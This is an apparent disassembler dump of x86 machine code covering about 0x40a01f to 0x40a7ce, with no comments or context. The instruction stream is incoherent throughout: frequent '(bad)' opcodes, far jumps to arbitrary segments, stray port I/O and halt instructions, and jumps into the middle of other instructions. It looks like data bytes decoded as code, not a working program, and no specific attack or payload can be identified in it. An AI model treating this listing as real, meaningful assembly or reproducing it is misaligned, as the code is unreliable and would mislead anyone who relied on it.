  40a01f:	jmp    0x58:0x85c0c073
  40a026:	or     BYTE PTR [esi],cl
  40a028:	shl    BYTE PTR [edx+ecx*8+0x6c],0x49
  40a02d:	inc    eax
  40a02e:	fst    DWORD PTR [eax+ebp*8]
  40a031:	aad    0xf0
  40a033:	adc    al,0x0
  40a035:	push   eax
  40a036:	lock dec edi
  40a038:	inc    eax
  40a039:	inc    ecx
  40a03a:	fsubr  st,st(1)
  40a03c:	jae    0x409ffe
  40a03e:	xor    BYTE PTR [edx+0x5a],0x0
  40a042:	enter  0x16ed,0x68
  40a046:	mov    edx,0x70004154
  40a04b:	sahf   
  40a04c:	push   esi
  40a04d:	add    al,bl
  40a04f:	inc    esp
  40a050:	push   0x578852
  40a055:	call   DWORD PTR [ebp-0x1da2192c]
  40a05b:	adc    al,0x0
  40a05d:	or     ebx,DWORD PTR [eax+0x64]
  40a060:	(bad)  
  40a061:	inc    DWORD PTR [eax]
  40a063:	add    BYTE PTR ds:0xc0a1e6cd,ah
  40a069:	adc    al,0x0
  40a06b:	push   eax
  40a06c:	lahf   
  40a06d:	jo     0x40a037
  40a06f:	call   0x3e7e92
  40a074:	add    DWORD PTR [ecx],esp
  40a076:	mov    esp,0xe6d3d5ff
  40a07b:	lea    esp,[eax]
  40a07d:	sbb    BYTE PTR [eax],al
  40a07f:	push   eax
  40a080:	outs   dx,DWORD PTR ds:[esi]
  40a081:	jo     0x40a047
  40a083:	call   0x3e7ada
  40a088:	shl    DWORD PTR [eax],1
  40a08a:	mov    eax,0xfed81d83
  40a08f:	jae    0x40a0f5
  40a091:	xchg   ebx,eax
  40a092:	jnp    0x40a04c
  40a094:	dec    eax
  40a095:	jo     0x40a0c5
  40a097:	push   0xef02eb31
  40a09c:	out    dx,eax
  40a09d:	mov    gs,WORD PTR [esi+0x8]
  40a0a0:	sbb    DWORD PTR [ecx+0x5f1efe80],ecx
  40a0a6:	outs   dx,DWORD PTR ds:[esi]
  40a0a7:	rcl    BYTE PTR [esi],0xe1
  40a0aa:	or     ch,al
  40a0ac:	jne    0x40a127
  40a0ae:	cmc    
  40a0af:	inc    BYTE PTR [esi]
  40a0b1:	shl    DWORD PTR [esi-0x151a7b02],0x38
  40a0b8:	lods   eax,DWORD PTR ds:[esi]
  40a0b9:	inc    esi
  40a0ba:	cmc    
  40a0bb:	(bad)  
  40a0bc:	fs test esp,esi
  40a0bf:	je     0x40a0fa
  40a0c1:	inc    ebp
  40a0c2:	es test dh,bl
  40a0c5:	push   ds
  40a0c6:	cmc    
  40a0c7:	je     0x40a0c9
  40a0c9:	add    cl,dh
  40a0cb:	push   ebp
  40a0cc:	cmp    DWORD PTR [edi+0x74f52ece],eax
  40a0d2:	stc    
  40a0d3:	add    eax,0xfebe8731
  40a0d8:	hlt    
  40a0d9:	je     0x40a0c8
  40a0db:	adc    eax,0xeae8729
  40a0e0:	cmc    
  40a0e1:	je     0x40a0c8
  40a0e3:	add    eax,0xde9e8721
  40a0e8:	repz je 0x40a0c4
  40a0eb:	adc    eax,0xee8e8719
  40a0f0:	out    0xc,eax
  40a0f2:	mov    dl,0x78
  40a0f4:	in     al,dx
  40a0f5:	add    eax,0x44bbf604
  40a0fa:	mov    ebx,ebp
  40a0fc:	add    al,BYTE PTR [eax]
  40a0fe:	xor    DWORD PTR [edx+0x76],ebp
  40a101:	call   0x6874c237
  40a106:	cwde   
  40a107:	adc    DWORD PTR [ebx+0x0],eax
  40a10a:	push   esi
  40a10b:	and    al,cl
  40a10d:	out    0x86,eax
  40a10f:	add    eax,0x143a0004
  40a114:	test   eax,0x23d7366e
  40a119:	in     al,dx
  40a11a:	xor    DWORD PTR [ecx+ebp*8],edx
  40a11d:	add    ebx,DWORD PTR [ecx+0x31432926]
  40a123:	(bad)  
  40a125:	(bad)  
  40a126:	push   ss
  40a127:	jg     0x40a149
  40a129:	add    al,0x31
  40a12b:	or     ebp,DWORD PTR [ecx+0x3600006e]
  40a131:	xlat   BYTE PTR ds:[ebx]
  40a132:	and    ebp,esp
  40a134:	xor    BYTE PTR [ecx+ebp*8],dl
  40a137:	add    edi,esi
  40a139:	push   0x95e4eb2d
  40a13e:	push   ebp
  40a13f:	hlt    
  40a140:	jmp    0x45de:0xe7ba2922
  40a147:	hlt    
  40a148:	loopne 0x40a0f7
  40a14a:	add    ch,bh
  40a14c:	daa    
  40a14d:	cdq    
  40a14e:	test   dh,dh
  40a150:	iret   
  40a151:	fisubr WORD PTR ds:0x5cebe16e
  40a157:	jge    0x40a118
  40a159:	ficomp WORD PTR ds:0x44ebc56e
  40a15f:	jge    0x40a110
  40a161:	ficomp WORD PTR [ebx+0x3e]
  40a164:	mov    eax,ds:0xaad11143
  40a169:	fdivp  st(5),st
  40a16b:	jmp    0xccef:0xf3f5dd27
  40a172:	sub    dl,BYTE PTR [ebx]
  40a174:	xor    DWORD PTR [ecx+0x72],ecx
  40a177:	loopne 0x40a12a
  40a179:	xlat   BYTE PTR ds:[ebx]
  40a17a:	xchg   esp,eax
  40a17b:	bnd ja 0x40a15c
  40a17e:	lods   eax,DWORD PTR ds:[esi]
  40a17f:	mov    DWORD PTR [esi+0x66f3cddd],esp
  40a185:	fsubp  st(0),st
  40a187:	add    ebp,DWORD PTR [edx-0x69012aa8]
  40a18d:	addr16 add ah,ch
  40a190:	mov    dl,0x26
  40a192:	add    BYTE PTR [eax+eax*1],dh
  40a195:	add    BYTE PTR [eax],bh
  40a197:	in     eax,dx
  40a198:	hlt    
  40a199:	call   0x153fb5d0
  40a19e:	sbb    esp,ebp
  40a1a0:	pop    ebp
  40a1a1:	js     0x40a1c5
  40a1a3:	fisttp WORD PTR [edx]
  40a1a5:	test   eax,0x47680da8
  40a1aa:	push   ecx
  40a1ab:	push   ebx
  40a1ac:	add    BYTE PTR [esi-0x68],bh
  40a1af:	or     al,ch
  40a1b1:	jb     0x40a13f
  40a1b3:	fdivp  st(6),st
  40a1b5:	xor    BYTE PTR [eax],0x6c
  40a1b8:	ret    
  40a1b9:	adc    eax,0xd4ff1474
  40a1be:	push   ds
  40a1bf:	in     al,dx
  40a1c0:	jmp    0x40a222
  40a1c2:	loop   0x40a1a2
  40a1c4:	mov    BYTE PTR [ebp+edx*4-0x21],ah
  40a1c8:	inc    BYTE PTR [esi+0x7d]
  40a1cb:	push   ds
  40a1cc:	add    ecx,ebp
  40a1ce:	xor    cl,BYTE PTR [edi-0x213cd47c]
  40a1d4:	(bad)  
  40a1d5:	cdq    
  40a1d6:	jmp    0x8490:0xc2268671
  40a1dd:	sub    eax,ebx
  40a1df:	fdivp  st(6),st
  40a1e1:	mov    ecx,0xfb7a8a3
  40a1e6:	mov    ds:0xfa49e7de,al
  40a1eb:	adc    eax,DWORD PTR [eax]
  40a1ed:	jo     0x40a197
  40a1ef:	cdq    
  40a1f0:	std    
  40a1f1:	test   BYTE PTR [ebx-0x559af0e3],0x14
  40a1f8:	add    cl,ch
  40a1fa:	add    BYTE PTR [eax],al
  40a1fc:	mov    cl,0x88
  40a1fe:	rcr    edi,0x83
  40a201:	fdivrp st(6),st
  40a203:	jmp    0x40a247
  40a205:	adc    al,0x0
  40a207:	jmp    0xc33a3f
  40a20c:	dec    eax
  40a20d:	adc    DWORD PTR [eax],eax
  40a20f:	lea    ecx,[edx]
  40a211:	xor    al,0x50
  40a213:	push   0x40fcc1
  40a218:	jo     0x40a28a
  40a21a:	push   edi
  40a21b:	add    BYTE PTR [eax-0x22],cl
  40a21e:	mov    esi,0x47c04d75
  40a223:	add    DWORD PTR [eax],ebx
  40a225:	adc    DWORD PTR [ebp-0x21d256b],ecx
  40a22b:	jmp    DWORD PTR [ebp+0x40502c57]
  40a231:	lods   eax,DWORD PTR ds:[esi]
  40a232:	sub    al,BYTE PTR [ecx+0x18]
  40a235:	mov    ecx,0x1118575a
  40a23a:	or     eax,eax
  40a23c:	fisttp QWORD PTR [ebx]
  40a23e:	jmp    0x51ab6f
  40a243:	dec    DWORD PTR ds:0x68bae805
  40a249:	loop   0x40a248
  40a24b:	or     ecx,DWORD PTR [eax]
  40a24d:	pop    esp
  40a24e:	punpckhbw mm0,QWORD PTR ds:0x70040f9
  40a255:	pop    esp
  40a256:	adc    al,0xe8
  40a258:	lahf   
  40a259:	pop    edi
  40a25a:	(bad)  
  40a25b:	jmp    DWORD PTR [ebx]
  40a25d:	fild   QWORD PTR [eax+0x0]
  40a260:	add    BYTE PTR [eax],al
  40a262:	pop    ss
  40a263:	pop    esp
  40a264:	adc    al,0xe8
  40a266:	rcr    DWORD PTR [edi-0x2],cl
  40a269:	inc    DWORD PTR ds:0x37fec07c
  40a26f:	loop   0x40a1fc
  40a271:	push   edx
  40a272:	fs inc esi
  40a274:	push   eax
  40a275:	call   0x3f0291
  40a27a:	test   al,0x40
  40a27c:	push   DWORD PTR [ebp+0x78]
  40a27f:	jecxz  0x40a2f4
  40a281:	or     al,0x57
  40a283:	fs or  al,ch
  40a286:	xor    DWORD PTR [edx-0x2d99010f],edi
  40a28c:	mov    BYTE PTR [esi+ebx*2+0x31dcdad5],al
  40a293:	jmp    0x40a297
  40a295:	(bad)  
  40a296:	repz push ss
  40a298:	jnp    0x40a21e
  40a29a:	jge    0x40a248
  40a29c:	lock dec cl
  40a29f:	outs   dx,BYTE PTR ds:[esi]
  40a2a0:	xor    DWORD PTR [ecx+0x31],eax
  40a2a3:	jle    0x40a25b
  40a2a5:	mov    bl,0x2f
  40a2a7:	xor    eax,0xffffffe7
  40a2aa:	sub    al,0x25
  40a2ac:	add    al,0x0
  40a2ae:	sub    ch,BYTE PTR [ebp-0x5776d189]
  40a2b4:	sbb    eax,DWORD PTR [ecx+0x31]
  40a2b7:	bound  esi,QWORD PTR [edi+0x14]
  40a2ba:	sbb    DWORD PTR [ebx+0x7c],esp
  40a2bd:	(bad)  
  40a2be:	(bad)  
  40a2bf:	jb     0x40a278
  40a2c1:	mov    bl,0xf7
  40a2c3:	cmp    dh,cl
  40a2c5:	dec    edi
  40a2c6:	add    BYTE PTR [eax],al
  40a2c8:	fld    DWORD PTR [edx]
  40a2ca:	jnp    0x40a2ca
  40a2cc:	out    0x9d,al
  40a2ce:	out    dx,eax
  40a2cf:	je     0x40a312
  40a2d1:	push   edx
  40a2d2:	ja     0x40a2e0
  40a2d4:	sbb    DWORD PTR [edx],0x22d90877
  40a2da:	in     al,dx
  40a2db:	inc    dh
  40a2dd:	push   ebp
  40a2de:	cmp    DWORD PTR [ebp-0x4b0ecd42],eax
  40a2e4:	jge    0x40a2e1
  40a2e6:	lock (bad) 
  40a2e8:	cdq    
  40a2e9:	mov    ebp,0x6e310058
  40a2ee:	in     al,dx
  40a2ef:	add    DWORD PTR [ebx],esp
  40a2f1:	mov    ecx,0xdbdd947b
  40a2f6:	out    dx,eax
  40a2f7:	(bad)  
  40a2f8:	xor    bh,ch
  40a2fa:	test   cl,ch
  40a2fc:	xor    edx,DWORD PTR [ebx+0x144f3981]
  40a302:	pop    edx
  40a303:	ja     0x40a338
  40a305:	out    dx,eax
  40a306:	sub    BYTE PTR [edx+eax*8+0x1b],bl
  40a30a:	sub    BYTE PTR [esi+eiz*2],al
  40a30d:	mov    eax,ds:0xdb5ff194
  40a312:	rcl    BYTE PTR [eax+0x53e913ff],1
  40a318:	fnstcw WORD PTR [edx-0xb]
  40a31b:	inc    edx
  40a31c:	xor    ebx,ebx
  40a31e:	jae    0x40a2d7
  40a320:	cmp    al,0xdb
  40a322:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a323:	(bad)  [ebx+eax*2+0x6c8103e9]
  40a32a:	inc    ebp
  40a32b:	xor    BYTE PTR [eax],al
  40a32d:	add    BYTE PTR [eax+0x14],dh
  40a330:	mov    ?,WORD PTR [esi-0xf7a261e]
  40a336:	push   cs
  40a337:	pop    ecx
  40a338:	push   ss
  40a339:	add    al,0x31
  40a33b:	ds adc ch,bh
  40a33e:	(bad)  
  40a33f:	pusha  
  40a340:	loope  0x40a33e
  40a342:	loopne 0x40a3a4
  40a344:	in     eax,dx
  40a345:	cld    
  40a346:	jmp    0xfc9cb2aa
  40a34b:	sub    ebp,DWORD PTR [eax-0xa9f19fd]
  40a351:	fist   DWORD PTR [ebp-0x74]
  40a354:	inc    ebp
  40a355:	lock xlat BYTE PTR ds:[ebx]
  40a357:	mov    al,ds:0xdacff174
  40a35c:	cwde   
  40a35d:	fist   DWORD PTR [ebp+0x6ef02d8b]
  40a363:	fistp  DWORD PTR [ebx-0x129f49ed]
  40a369:	push   ebx
  40a36a:	scas   al,BYTE PTR es:[edi]
  40a36b:	pusha  
  40a36c:	loope  0x40a349
  40a36e:	jb     0x40a34d
  40a370:	or     eax,0x6cb096f0
  40a375:	lock xchg edi,eax
  40a377:	mov    BYTE PTR [ebx-0x3b],ah
  40a37a:	mov    edx,ds
  40a37c:	push   ebp
  40a37e:	jecxz  0x40a35a
  40a380:	mov    ah,0x2d
  40a382:	sbb    cl,0xfe
  40a385:	shr    DWORD PTR [edx],1
  40a387:	inc    edx
  40a388:	add    cl,ch
  40a38a:	mov    ecx,0xe96c0e9a
  40a38f:	fsin   
  40a391:	into   
  40a392:	add    BYTE PTR [eax],al
  40a394:	dec    esi
  40a395:	lahf   
  40a396:	mov    ebx,0xe7d946c7
  40a39b:	out    dx,eax
  40a39c:	in     al,0x13
  40a39e:	add    BYTE PTR [esi-0x51025d78],dh
  40a3a4:	dec    esi
  40a3a5:	bnd je 0x40a415
  40a3a8:	inc    esi
  40a3a9:	fxch   st(0)
  40a3ab:	stos   DWORD PTR es:[edi],eax
  40a3ac:	inc    ebp
  40a3ad:	adc    al,0x55
  40a3af:	bound  edx,QWORD PTR [ecx]
  40a3b1:	(bad)  [ebp+ebx*8+0xf]
  40a3b5:	popa   
  40a3b6:	adc    BYTE PTR [esi-0xb00f768],al
  40a3bc:	or     dh,dl
  40a3be:	ret    
  40a3bf:	je     0x40a3d7
  40a3c1:	fcmovne st,st(0)
  40a3c3:	stos   DWORD PTR es:[edi],eax
  40a3c4:	xor    DWORD PTR [edx*2-0x3c68ee8e],edx
  40a3cb:	pop    ecx
  40a3cc:	xchg   cl,bl
  40a3ce:	je     0x40a3b5
  40a3d0:	or     dh,BYTE PTR [eax-0x77]
  40a3d3:	dec    esi
  40a3d4:	into   
  40a3d5:	push   cs
  40a3d6:	sar    BYTE PTR [ecx+ebp*1+0x312bc939],0x14
  40a3de:	(bad)  
  40a3df:	mov    esp,0x6054ec22
  40a3e4:	into   
  40a3e5:	fimul  DWORD PTR [edx]
  40a3e7:	sub    DWORD PTR [eax],edi
  40a3e9:	maxps  xmm6,XMMWORD PTR [eax]
  40a3ec:	jae    0x40a3fb
  40a3ee:	add    BYTE PTR [esi],dl
  40a3f0:	sub    BYTE PTR [eax],cl
  40a3f2:	call   0xff1ac3e7
  40a3f7:	add    BYTE PTR [eax],al
  40a3f9:	add    BYTE PTR [ebx-0x5ff08c2b],ah
  40a3ff:	aam    0x26
  40a401:	inc    ecx
  40a402:	cwde   
  40a403:	jmp    0xff85:0xa2300c73
  40a40a:	(bad)  
  40a40b:	mov    esi,0xea586a08
  40a410:	jae    0x40a41e
  40a412:	jo     0x40a48f
  40a414:	test   edi,edi
  40a416:	outs   dx,DWORD PTR ds:[esi]
  40a417:	pop    eax
  40a418:	inc    esp
  40a419:	hlt    
  40a41a:	add    BYTE PTR [ebx],bh
  40a41c:	aas    
  40a41d:	inc    ecx
  40a41e:	pop    eax
  40a41f:	jmp    0xff85:0x8b70f473
  40a426:	(bad)  
  40a427:	pop    eax
  40a428:	inc    esp
  40a429:	clc    
  40a42a:	and    BYTE PTR [esi-0x42e7ff05],bh
  40a430:	add    eax,DWORD PTR [edi+edi*4-0x53ba7817]
  40a437:	cmp    al,0x0
  40a439:	adc    BYTE PTR [eax],cl
  40a43b:	adc    eax,0xea9bf8e8
  40a440:	std    
  40a441:	mov    DWORD PTR [ebp-0x20],edx
  40a444:	std    
  40a445:	jne    0x40a3c7
  40a447:	mov    ebp,0xea8f88a8
  40a44c:	or     eax,eax
  40a44e:	fist   WORD PTR [eax+0x14d800bb]
  40a454:	push   DWORD PTR [ebp-0x80]
  40a457:	cmp    eax,0x14c8fde8
  40a45c:	push   DWORD PTR [ebp+0x0]
  40a45f:	add    BYTE PTR [edi*4+0x14d85580],cl
  40a466:	cmp    eax,0xffffffca
  40a469:	fld    DWORD PTR [esp+eiz*4-0x74ffeb38]
  40a470:	int    0xe8
  40a472:	jle    0x40a4b3
  40a474:	xor    ebx,ebp
  40a476:	std    
  40a477:	cmp    DWORD PTR [ecx+0x90002ea],0xffffff8d
  40a47e:	sub    eax,0xda823141
  40a483:	cmp    edi,ebx
  40a485:	jmp    0xff76:0x5e710b02
  40a48c:	cld    
  40a48d:	repnz pop ebx
  40a48f:	(bad)  
  40a490:	ds jmp 0x40a495
  40a493:	(bad)  
  40a494:	fdivr  QWORD PTR [edx+0x2c09cf5b]
  40a49a:	add    al,0x68
  40a49c:	fcom   QWORD PTR [ecx]
  40a49e:	inc    ebx
  40a49f:	add    dh,ah
  40a4a1:	ret    0x5532
  40a4a4:	xor    ebx,ebp
  40a4a6:	idiv   DWORD PTR [edi+0x74ed02c5]
  40a4ac:	cmp    DWORD PTR [ebx+eax*1],eax
  40a4af:	push   0x41b69b
  40a4b4:	jle    0x40a44b
  40a4b6:	ss push ebp
  40a4b8:	xor    ebp,ebp
  40a4ba:	jg     0x40a4b3
  40a4bc:	xor    al,bl
  40a4be:	xor    eax,0xed5d84ff
  40a4c3:	je     0x40a4c5
  40a4c5:	add    ch,bh
  40a4c7:	xchg   ebp,eax
  40a4c8:	jmp    0x54a7a352
  40a4cd:	mov    esp,ecx
  40a4cf:	inc    edx
  40a4d0:	sti    
  40a4d1:	jg     0x40a4fe
  40a4d3:	push   es
  40a4d4:	ja     0x40a4d9
  40a4d6:	out    dx,eax
  40a4d7:	jmp    0x40a527
  40a4d9:	inc    edx
  40a4da:	sub    bl,BYTE PTR [ebx]
  40a4dc:	js     0x40a4e3
  40a4de:	mov    cl,0x13
  40a4e0:	add    al,0x75
  40a4e2:	fist   WORD PTR [esi]
  40a4e4:	ja     0x40a4f6
  40a4e6:	popa   
  40a4e7:	push   ds
  40a4e8:	ja     0x40a4f2
  40a4ea:	leave  
  40a4eb:	cs out dx,al
  40a4ed:	(bad)  
  40a4ee:	mov    dh,0x14
  40a4f0:	adc    DWORD PTR [ecx],esi
  40a4f2:	mov    dl,0xd7
  40a4f4:	sbb    eax,0x9bd734d9
  40a4f9:	adc    ebx,DWORD PTR [esi+0x1ded1961]
  40a4ff:	or     al,0x11
  40a501:	mov    dl,0x8c
  40a503:	xlat   BYTE PTR ds:[ebx]
  40a504:	std    
  40a505:	out    dx,eax
  40a506:	inc    ebx
  40a507:	aam    0x2f
  40a509:	in     eax,dx
  40a50a:	jg     0x40a4e3
  40a50c:	in     eax,dx
  40a50d:	icebp  
  40a50e:	les    ebx,FWORD PTR [esi+ebp*8]
  40a511:	cld    
  40a512:	mov    ch,0x6c
  40a514:	fsubp  st(4),st
  40a516:	xlat   BYTE PTR ds:[bx]
  40a518:	pop    ebx
  40a519:	clc    
  40a51a:	push   esi
  40a51b:	or     eax,0xd757ec6a
  40a520:	cmp    esi,esp
  40a522:	push   esi
  40a523:	adc    eax,0xd747ec6a
  40a528:	cmp    ebp,esp
  40a52a:	add    BYTE PTR [eax],al
  40a52c:	push   esi
  40a52d:	(bad)  [edx-0x14]
  40a530:	aaa    
  40a531:	xlat   BYTE PTR ds:[ebx]
  40a532:	sbb    esi,eax
  40a534:	push   ss
  40a535:	in     eax,0x6a
  40a537:	in     al,dx
  40a538:	daa    
  40a539:	xlat   BYTE PTR ds:[ebx]
  40a53a:	sbb    edx,DWORD PTR [esi+ebx*1]
  40a53d:	popa   
  40a53e:	fucomp st(4)
  40a540:	popf   
  40a541:	or     al,0x91
  40a543:	jno    0x40a554
  40a545:	xlat   BYTE PTR ds:[ebx]
  40a546:	jge    0x40a594
  40a548:	clc    
  40a549:	shl    esp,1
  40a54b:	add    esp,DWORD PTR [ebx+ecx*4+0x7c]
  40a54f:	xor    dl,0xeb
  40a552:	gs jbe 0x40a59a
  40a555:	xlat   BYTE PTR ds:[ebx]
  40a556:	rcl    DWORD PTR [ebx],cl
  40a558:	fldcw  WORD PTR [esp+edi*4+0x3]
  40a55c:	xor    DWORD PTR [ebx],ecx
  40a55e:	sub    DWORD PTR [edi+0x7e],esi
  40a561:	push   0xffffffe9
  40a563:	pop    ebx
  40a564:	dec    ebx
  40a565:	pop    ss
  40a566:	test   al,0x3
  40a568:	(bad)  
  40a569:	pusha  
  40a56a:	add    cl,bl
  40a56c:	int    0x5f
  40a56e:	or     al,0x41
  40a570:	jne    0x40a501
  40a572:	(bad)  
  40a573:	es test eax,0x2a87396
  40a579:	inc    esp
  40a57a:	call   0xff16c41b
  40a57f:	loop   0x40a5f3
  40a581:	bound  esi,QWORD PTR [ecx]
  40a583:	jo     0x40a57c
  40a585:	jmp    0x40a5f0
  40a587:	jecxz  0x40a5f3
  40a589:	out    0x85,eax
  40a58b:	test   BYTE PTR [edx+0x75c009],0x0
  40a592:	sub    edi,edx
  40a594:	je     0x40a597
  40a596:	add    eax,0x5a6783ec
  40a59b:	aad    0x4f
  40a59d:	(bad)  
  40a59e:	loopne 0x40a58b
  40a5a0:	dec    edi
  40a5a1:	into   
  40a5a2:	loopne 0x40a5af
  40a5a4:	call   0xff1600bb
  40a5a9:	rcr    edx,1
  40a5ab:	xchg   ecx,eax
  40a5ac:	(bad)  
  40a5ad:	mov    dh,0x4a
  40a5af:	pop    edi
  40a5b0:	call   0xfed26876
  40a5b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a5b6:	or     eax,0x1a9e8264
  40a5bb:	outs   dx,BYTE PTR ds:[esi]
  40a5bc:	add    cl,ah
  40a5be:	xor    dl,BYTE PTR [eax+ebp*8]
  40a5c1:	push   cs
  40a5c2:	scas   eax,DWORD PTR es:[edi]
  40a5c3:	(bad)  
  40a5c4:	(bad)  
  40a5c5:	jo     0x40a637
  40a5c7:	fmul   QWORD PTR [esp-0x300b9e7]
  40a5ce:	and    dl,ch
  40a5d0:	je     0x40a5af
  40a5d2:	ficomp DWORD PTR [edi+0x932e953]
  40a5d8:	rcl    ah,0x62
  40a5db:	int    0x44
  40a5dd:	pop    ecx
  40a5de:	xor    eax,0xf3e90014
  40a5e3:	push   eax
  40a5e4:	hlt    
  40a5e5:	add    BYTE PTR [edi+0x11],dh
  40a5e8:	add    BYTE PTR [eax],al
  40a5ea:	loop   0x40a5fd
  40a5ec:	push   0x0
  40a5ee:	repnz adc DWORD PTR [edx+0x0],ebp
  40a5f2:	push   ebp
  40a5f3:	push   ebx
  40a5f4:	hlt    
  40a5f5:	push   eax
  40a5f6:	add    BYTE PTR [eax],al
  40a5f8:	push   edi
  40a5f9:	arpl   ax,di
  40a5fb:	(bad)  
  40a5fc:	mov    ebp,0x4475fde1
  40a601:	mov    eax,0x1188548e
  40a606:	or     eax,eax
  40a608:	or     al,0xf
  40a60a:	jmp    0x40a646
  40a60c:	mov    al,ds:0x8841269c
  40a611:	jmp    0xff83:0xa2301073
  40a618:	push   edi
  40a619:	jmp    0x85ff:0xb828f873
  40a620:	xchg   edx,ebp
  40a622:	xchg   DWORD PTR [ebp-0x6c],eax
  40a625:	jmp    0xff14:0x64771873
  40a62c:	std    
  40a62d:	mov    ebx,0xea5475fd
  40a632:	jae    0x40a63c
  40a634:	jo     0x40a63e
  40a636:	(bad)  
  40a637:	call   edi
  40a639:	jmp    0xba0192b1
  40a63e:	jg     0x40a63f
  40a640:	(bad)  
  40a641:	jmp    0x89f49689
  40a646:	std    
  40a647:	jne    0x40a5fd
  40a649:	mov    eax,0x1118543a
  40a64e:	push   DWORD PTR [ebp-0x80]
  40a651:	mov    ecx,0xea8781d8
  40a656:	mov    edx,0x8b5510ec
  40a65c:	add    BYTE PTR [eax],al
  40a65e:	je     0x40a5f0
  40a660:	ret    0x31f4
  40a663:	cmp    eax,0xeb4bfeea
  40a668:	pop    esp
  40a669:	and    al,0xce
  40a66b:	xchg   edi,eax
  40a66c:	cli    
  40a66d:	out    0xc8,eax
  40a66f:	xchg   esp,eax
  40a670:	jmp    0xe6e84f73
  40a675:	(bad)  
  40a676:	sub    al,0x78
  40a678:	sub    DWORD PTR [ecx+0x31],eax
  40a67b:	jmp    0x40a67f
  40a67d:	add    BYTE PTR [ecx],dh
  40a67f:	push   0xfd9ff680
  40a684:	jmp    0x42fafd8
  40a689:	add    BYTE PTR [ecx],dh
  40a68b:	add    esi,DWORD PTR [esi+0x53]
  40a68e:	xor    ebx,ebp
  40a690:	pop    edx
  40a691:	adc    esi,ecx
  40a693:	stos   DWORD PTR es:[edi],eax
  40a694:	add    ch,BYTE PTR [eax+0x2a]
  40a697:	stos   DWORD PTR es:[edi],eax
  40a698:	inc    ebx
  40a699:	add    cl,bl
  40a69b:	pop    es
  40a69c:	inc    esp
  40a69d:	inc    ecx
  40a69e:	xor    DWORD PTR [esi+0x2c085c2e],esi
  40a6a4:	add    al,0xff
  40a6a6:	fdivr  st(2),st
  40a6a8:	fisub  DWORD PTR [edi+0x67e8cd4f]
  40a6ae:	and    ch,BYTE PTR [ebx]
  40a6b0:	inc    ebx
  40a6b1:	add    cl,cl
  40a6b3:	icebp  
  40a6b4:	inc    edx
  40a6b5:	inc    ecx
  40a6b6:	xor    DWORD PTR [ebx+0x1f],edx
  40a6b9:	inc    eax
  40a6ba:	jo     0x40a679
  40a6bc:	pop    edx
  40a6bd:	add    dh,BYTE PTR [ecx]
  40a6bf:	mov    ebp,0xfe82
  40a6c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a6c5:	mov    ch,0xda
  40a6c7:	mov    edx,DWORD PTR [edi]
  40a6c9:	mov    ds:0x52b48ce8,eax
  40a6ce:	jmp    0x6215:0xdc2e06fe
  40a6d5:	mov    ebp,0x417cff02
  40a6da:	jmp    0x5154e053
  40a6df:	shl    DWORD PTR [ebx+edx*8+0x5d],cl
  40a6e3:	mov    ebx,0x4ee918f0
  40a6e8:	stos   BYTE PTR es:[edi],al
  40a6e9:	shl    BYTE PTR [edi-0x40],0xc2
  40a6ed:	rol    BYTE PTR [ebp-0x17],cl
  40a6f0:	pop    eax
  40a6f1:	adc    al,0xd3
  40a6f3:	push   ds
  40a6f4:	mov    esi,0x40dbe149
  40a6f9:	push   edx
  40a6fa:	cs jmp 0x5e6600b9
  40a700:	dec    ebx
  40a701:	mov    esp,0xd39f7e9d
  40a706:	loope  0x40a6cb
  40a708:	and    bh,al
  40a70a:	adc    BYTE PTR [ecx+esi*8],0x54
  40a70e:	jmp    0x64694066
  40a713:	jmp    0x3c20b97
  40a718:	and    ebx,eax
  40a71a:	cs pop esp
  40a71c:	push   es
  40a71d:	push   esp
  40a71e:	sub    BYTE PTR [ecx+eax*1],al
  40a721:	rcl    DWORD PTR [ebx-0x4],cl
  40a724:	push   esi
  40a725:	lock mov ebp,eax
  40a728:	add    BYTE PTR [eax],al
  40a72a:	push   edi
  40a72b:	mov    esp,0xd34f82e0
  40a730:	lods   eax,DWORD PTR ds:[esi]
  40a731:	(bad)  
  40a732:	cmc    
  40a733:	adc    ch,BYTE PTR [eax]
  40a735:	add    al,0x30
  40a737:	adc    al,0xe9
  40a739:	add    esp,DWORD PTR [ecx+ebx*4-0x2cd0164b]
  40a740:	cmp    BYTE PTR [ebp+ebp*1+0x15],bl
  40a744:	jmp    0x3ad1b04c
  40a749:	add    al,0x31
  40a74b:	cmp    al,0xfa
  40a74d:	inc    ebx
  40a74e:	jo     0x40a764
  40a750:	adc    ebp,edi
  40a752:	inc    esi
  40a753:	push   ebp
  40a754:	jmp    0x94fbb4
  40a759:	sub    BYTE PTR ds:0x4a0d34d3,ch
  40a75f:	push   ebp
  40a760:	add    BYTE PTR [esi+0x57],ah
  40a763:	sbb    al,0xe8
  40a765:	pop    ebx
  40a766:	xlat   BYTE PTR ds:[ebx]
  40a767:	sar    esi,1
  40a769:	sar    DWORD PTR ds:0x6ae94154,0x1f
  40a770:	inc    eax
  40a771:	test   al,0x32
  40a773:	cmp    al,0x25
  40a775:	test   eax,0xeb681473
  40a77a:	xor    dl,BYTE PTR [eax+eax*4]
  40a77d:	cs pop ds
  40a77f:	sbb    al,0xe8
  40a781:	aas    
  40a782:	(bad)  
  40a783:	sar    esi,1
  40a785:	ins    BYTE PTR es:[edi],dx
  40a786:	pop    ds
  40a787:	retf   0x16fd
  40a78a:	mov    DWORD PTR [edx-0x18],esp
  40a78d:	mov    DWORD PTR [eax],eax
  40a78f:	add    ah,ah
  40a791:	adc    eax,DWORD PTR [eax]
  40a793:	push   es
  40a794:	pop    ss
  40a795:	sar    dh,1
  40a797:	je     0x40a813
  40a799:	mov    edx,0xd189771a
  40a79e:	enter  0x6e2b,0xd2
  40a7a2:	push   ebx
  40a7a3:	jb     0x40a72e
  40a7a5:	xchg   ebx,eax
  40a7a6:	ret    
  40a7a7:	aad    0x57
  40a7a9:	sar    esi,1
  40a7ab:	inc    ebx
  40a7ac:	sub    eax,0xc0ce263e
  40a7b1:	sbb    ebp,eax
  40a7b3:	test   eax,ebx
  40a7b5:	sar    dh,cl
  40a7b7:	jo     0x40a7a9
  40a7b9:	iret   
  40a7ba:	(bad)  
  40a7bb:	in     al,dx
  40a7bc:	stc    
  40a7bd:	adc    al,BYTE PTR [ecx-0x17]
  40a7c0:	xor    dl,BYTE PTR [eax+eax*1]
  40a7c3:	jmp    0xa0374071
  40a7c8:	push   ss
  40a7c9:	ror    DWORD PTR [edi+0x1],cl
  40a7cc:	xor    DWORD PTR [ebx],edx
  40a7ce:	add    cl,ch
